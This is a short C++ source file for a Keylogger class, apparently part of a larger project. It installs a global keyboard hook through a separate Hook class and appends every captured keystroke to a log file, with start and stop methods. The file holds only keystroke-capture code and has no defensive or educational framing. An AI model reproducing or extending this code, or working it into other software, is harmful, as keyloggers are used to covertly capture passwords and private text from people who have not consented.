#include "stdafx.h"
#include "Keylogger.h"


void Keylogger::start() {
	hook = new Hook();
	//std::function<void(wchar_t[])> callback = std::bind(&Keylogger::keyboardHandler, this);
	hook->SetHook([this](wchar_t key[]) {
		keyboardHandler(key);
	});
	logFile.open(FILENAME, std::ios::app);
}

void Keylogger::keyboardHandler(wchar_t* key) {
	std::cout << "key\n";
	logFile << key << std::flush;
}

void Keylogger::stop() {
	logFile.close();
}